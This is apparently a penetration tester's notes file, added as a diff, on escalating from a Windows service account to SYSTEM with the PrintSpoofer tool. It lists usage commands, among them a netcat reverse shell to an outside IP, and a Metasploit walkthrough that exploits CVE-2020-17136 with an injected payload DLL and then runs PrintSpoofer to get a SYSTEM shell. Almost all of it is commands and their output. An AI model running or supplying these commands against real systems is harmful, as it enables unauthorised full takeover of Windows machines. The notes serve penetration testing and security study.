@@ -1,0 +1,130 @@
+=============================================================================================================================
+Local Privilege Escalation from a Windows Service account to 'NT AUTHORITY\SYSTEM' using the tool 'PrintSpoofer'
+=============================================================================================================================
+
+Windows local privilege escalation from 'LOCAL/NETWORK SERVICE' to 'NT AUTHORITY\SYSTEM' by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019 
+with the tool 'PrintSpoofer'.
+
+> Github link: https://github.com/itm4n/PrintSpoofer
+
+Examples:
+- Run PowerShell as SYSTEM in the current console:                    PrintSpoofer.exe -i -c powershell.exe
+- Spawn a SYSTEM command prompt on the desktop of the session 1:      PrintSpoofer.exe -d 1 -c cmd.exe
+- Get a SYSTEM reverse shell:                                         PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
+
+
+=============================================================================================================================
+Basic test of the tool 'PrintSpoofer' with a reverse shell running as 'NT AUTHORITY\NETWORK SERVICE' on a Windows 10 laptop
+=============================================================================================================================
+
+Step 1 - We have a meterpreter reverse shell running as a low-privielged user on a Windows 10 laptop 
+---------------------------------------------------------------------------------------------------------------------------
+
+msf6 exploit(windows/local/cve_2020_17136) > sessions -i
+
+Active sessions
+===============
+  Id  Name  Type                     Information                                 Connection
+  --  ----  ----                      -----------                                ----------
+  5         meterpreter x64/windows  DESKTOP-6U70QND\auditor @ DESKTOP-6U70QND   192.168.1.11:9443 -> 192.168.1.41:57898 (192.168.1.41)
+
+
+Step 2 - We escalate our privileges to "NT AUTHORITY\NETWORK SERVICE" by exploiting the vulnerability 'cve-2020-17136'
+---------------------------------------------------------------------------------------------------------------------------
+
+msf6 exploit(windows/local/cve_2020_17136) > run
+                                                                                                                                                                                                                                           
+[*] Started reverse TCP handler on 192.168.1.11:4444                                                                                                                                                                                       
+[*] Running automatic check ("set AutoCheck false" to disable)                                                                                                                                                                             
+[+] The target appears to be vulnerable. A vulnerable Windows 10 v1909 build was detected!                                                                                                                                                 
+[*] Dropping payload dll at C:\Windows\Temp\SmQIYWKkJrlCkiev.dll and registering it for cleanup...                                                                                                                                         
+[*] Running module against DESKTOP-6U70QND                                                                                                                                                                                                 
+[*] Launching notepad.exe to host CLR...                                                                                                                                                                                                   
+[+] Process 1984 launched.                                                                                                                                                                                                                 
+[*] Reflectively injecting the Host DLL into 1984..                                                                                                                                                                                        
+[*] Injecting Host into 1984...                                                                                                                                                                                                            
+[*] Host injected. Copy assembly into 1984...                                                                                                                                                                                              
+[*] Assembly copied.                                                                                                                                                                                                                       
+[*] Executing...                                                                                                                                                                                                                           
+[*] Start reading output                                                                                                                                                                                                                   
+[+] Sync connection key: 1989898575248                                                                                                                                                                                                     
+[+] Done                                                                                                                                                                                                                                   
+[*] End output.                                                                                                                                                                                                                            
+[+] Execution finished.                                                                                                                                                                                                                    
+[*] Sending stage (200262 bytes) to 192.168.1.41                                                                                                                                                                                           
+[*] Meterpreter session 6 opened (192.168.1.11:4444 -> 192.168.1.41:57900) at 2021-08-15 02:10:17 +0200                                                                                                                                    
+                                                                                                                                                                                                                                           
+meterpreter > getuid                                                                                                                                                                                                                       
+Server username: NT AUTHORITY\NETWORK SERVICE     
+
+meterpreter > shell                                                                                                                                                                                                                        
+Process 5708 created.                                                                                                                                                                                                                      
+Channel 2 created.                                                                                                                                                                                                                         
+Microsoft Windows [Version 10.0.18363.418]                                                                                                                                                                                                 
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+whoami
+nt authority\network service
+
+
+C:\Windows\system32> whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
+=> We have the privilege 'SeImpersonatePrivilege'.
+
+
+Step 3 - We execute 'PrintSpoofer64.exe' and obtain a shell running as 'NT AUTHORITY\SYSTEM'
+---------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Public>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 28CF-48B0
+
+ Directory of C:\Users\Public
+
+08/15/2021  02:11 AM    <DIR>          .
+08/15/2021  02:11 AM    <DIR>          ..
+08/12/2021  12:40 AM    <DIR>          Documents
+03/18/2019  09:52 PM    <DIR>          Downloads
+03/18/2019  09:52 PM    <DIR>          Music
+03/18/2019  09:52 PM    <DIR>          Pictures
+08/15/2021  02:11 AM            27,136 PrintSpoofer64.exe
+<SNIP>
+
+
+C:\Users\Public>PrintSpoofer64.exe -i -c cmd    
+
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.18363.418]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+
+=> The tool works well :-)
+
